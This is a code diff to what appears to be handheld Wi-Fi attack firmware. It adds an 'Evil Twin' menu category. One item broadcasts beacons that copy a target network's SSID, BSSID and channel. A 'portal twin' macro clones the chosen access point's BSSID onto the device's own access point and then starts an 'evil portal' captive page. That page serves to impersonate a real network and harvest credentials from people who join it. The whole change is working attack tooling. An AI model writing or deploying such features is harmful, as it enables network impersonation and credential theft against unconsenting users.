@@ -70,6 +70,13 @@ static const Item I_ATK[] = {
   {"evil portal(SD)", "evilportal -c start",F_TX|F_SCAN},   // needs portal html on SD
   {"karma (target)",  "karma -p",           F_TX|F_TARGET|F_SCAN},
 };
+static const Item I_TWIN[] = {
+  // beacon twin: broadcastCustomBeacon() injects the target's real SSID+BSSID+channel
+  {"beacon twin",    "attack -t beacon -a", F_TX|F_SELTGT|F_SCAN},
+  // portal twin: clone target BSSID onto our AP iface, then bring up the captive
+  // soft-AP. "@twinportal" is a macro intercepted in runItem(). Needs portal html on SD.
+  {"portal twin(SD)","@twinportal",         F_TX|F_SELTGT|F_SCAN},
+};
 static const Item I_BLE[] = {
   {"sniffbt airtag",  "sniffbt -t airtag",  F_SCAN},
   {"sniffbt flipper", "sniffbt -t flipper", F_SCAN},
@@ -122,6 +129,7 @@ static const Cat CATS[] = {
   {"Defensive Detect",  I_DEF,  NI(I_DEF)},
   {"Passive Sniff",     I_PASS, NI(I_PASS)},
   {"Attack / Offensive",I_ATK,  NI(I_ATK)},
+  {"Evil Twin",         I_TWIN, NI(I_TWIN)},
   {"BLE Tools",         I_BLE,  NI(I_BLE)},
   {"MAC-Spoof / ID",    I_MAC,  NI(I_MAC)},
   {"Target / Session",  I_SESS, NI(I_SESS)},
@@ -148,7 +156,7 @@ static const unsigned char IC_SD[8]    = {0x3e,0x22,0x2a,0x22,0x22,0x22,0x3e,0x0
 static const unsigned char IC_GEAR[8]  = {0x08,0x2a,0x1c,0x63,0x1c,0x2a,0x08,0x00};
 static const unsigned char IC_WIFI[8]  = {0x80,0x80,0xa0,0xa0,0xa8,0xa8,0xaa,0xaa};
 static const unsigned char* const CAT_ICONS[] = {
-  IC_SCAN, IC_SHIELD, IC_EYE, IC_WARN, IC_BT, IC_MASK, IC_LIST, IC_NET, IC_SD, IC_GEAR
+  IC_SCAN, IC_SHIELD, IC_EYE, IC_WARN, IC_MASK, IC_BT, IC_MASK, IC_LIST, IC_NET, IC_SD, IC_GEAR
 };
 
 static const unsigned char BAT_BMP[] = {
@@ -511,6 +519,16 @@ void OledStatus::runItem(const void* item){
   const Item* it=(const Item*)item;
   // build the command, applying a chosen target index if needed
   String cmd = it->cmd;
+  // Evil-twin macro: clone the picked AP's BSSID onto our AP iface, then bring
+  // up the captive soft-AP. Two CLI calls, so it can't be a plain single cmd.
+  if(cmd == "@twinportal"){
+    if(pend_target>=0){
+      cli_obj.runCommand(String("cloneapmac -a ")+pend_target);
+      cli_obj.runCommand("evilportal -c start");
+      this->run_start=millis(); this->screen=RUNNINGS;
+    } else { showToast("pick a target"); this->screen=FEAT; }
+    this->pend_target=-1; this->pend_item=0; return;
+  }
   if((it->flags & (F_TARGET|F_SELTGT)) && pend_target>=0){
     if(it->flags & F_SELTGT){
       cli_obj.runCommand(String("select -a ")+pend_target);
